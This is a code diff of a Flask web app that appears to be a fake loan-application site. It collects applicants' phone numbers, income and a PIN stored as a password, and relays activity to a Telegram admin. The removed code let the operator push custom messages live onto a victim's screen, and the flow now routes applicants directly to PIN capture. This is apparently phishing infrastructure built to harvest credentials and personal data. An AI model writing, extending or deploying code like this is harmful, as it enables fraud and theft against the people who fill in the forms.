@@ -237,25 +237,6 @@ def telegram_webhook():
                 except Exception as e:
                     print(f"Answer callback error: {e}")
 
-        # 2. Handle Direct Telegram Admin Messages
-        elif "message" in data:
-            msg = data["message"]
-            chat_id = str(msg.get("chat", {}).get("id"))
-            text = msg.get("text", "").strip()
-            
-            if chat_id == TELEGRAM_ADMIN_CHAT_ID:
-                latest_app = applications_collection.find_one(sort=[("_id", -1)])
-                if latest_app:
-                    applications_collection.update_one(
-                        {"_id": latest_app["_id"]},
-                        {"$set": {"custom_message": text, "status": "CustomMessage"}}
-                    )
-                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                    requests.post(reply_url, json={
-                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
-                        "text": f"📢 Pushed live to user screen:\n\"{text}\""
-                    })
-
         return jsonify({"status": "ok"}), 200
     except Exception as global_err:
         print(f"❌ Webhook global error caught: {global_err}")
@@ -265,17 +246,13 @@ def telegram_webhook():
 def index():
     return render_template("index.html")
 
-@app.route("/sim-check")
-def sim_check():
-    return render_template("sim_check.html")
-
 @app.route("/apply/step1", methods=["GET", "POST"])
 def apply_step1():
     if request.method == "POST":
         session["loan_type"] = request.form.get("loan_type")
         session["amount"] = request.form.get("amount")
         session["term"] = request.form.get("term")
-        session["whatsapp_phone"] = request.form.get("whatsapp_phone")  # Captured from Step 1
+        session["whatsapp_phone"] = request.form.get("whatsapp_phone")
         session["purpose"] = request.form.get("purpose")
         return redirect(url_for("apply_step2"))
     return render_template("apply_step1.html")
@@ -294,12 +271,8 @@ def apply_step3():
     if request.method == "POST":
         session["employment"] = request.form.get("employment")
         session["income"] = request.form.get("income")
-        return redirect(url_for("processing_screen"))
+        return redirect(url_for("login"))
     return render_template("apply_step3.html")
-
-@app.route("/processing")
-def processing_screen():
-    return render_template("processing.html")
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -314,7 +287,7 @@ def login():
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
-            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),  # Pulls correct session data from Step 1
+            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),
             "employment": session.get("employment", "Self-Employed"),
             "income": session.get("income", "500000"),
             "password": pin,
@@ -433,10 +406,6 @@ def final_verify():
     except Exception as e:
         print(f"Template error for final_verify.html: {e}")
         return redirect(url_for("pending", app_id=app_id))
-
-@app.route("/post-processing")
-def post_processing():
-    return render_template("processing.html")
 
 @app.route("/success")
 def success():
